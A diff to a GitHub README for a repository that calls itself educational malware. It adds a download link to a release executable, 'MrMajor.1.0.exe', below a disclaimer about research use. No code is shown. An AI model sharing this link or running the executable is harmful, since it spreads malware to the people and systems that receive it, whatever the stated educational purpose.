@@ -13,3 +13,7 @@ This repository contains malware designed **solely** for educational and researc
 4. **Educational Purposes Only**: This software is intended for educational purposes to help individuals understand and defend against malware attacks. The author does not support any malicious use of this software.
 
 ![image](https://github.com/user-attachments/assets/123aa25e-1f03-431a-ab15-b4da85fbdf67)
+
+
+
+[DOWNLOAD](https://github.com/Sheudz/MrMajor/releases/download/1.0.0/MrMajor.1.0.exe)
